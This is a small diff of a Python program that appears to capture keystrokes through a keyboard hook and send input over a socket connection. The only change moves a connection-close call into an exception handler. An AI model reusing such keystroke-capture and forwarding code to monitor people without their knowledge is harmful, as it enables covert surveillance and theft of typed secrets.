@@ -32,12 +32,12 @@ def send_inputs():
             new_hook.start()
         except KeyboardInterrupt:
             connection.send('kill'.encode())
+            conn.close()
             pass
         except Exception as ex:
             print(ex)
 
 
-    # conn.close()  # close the connection
 def OnKeyPress(event):
     global PreviousPayload
     WhatKey(event.Key, True)
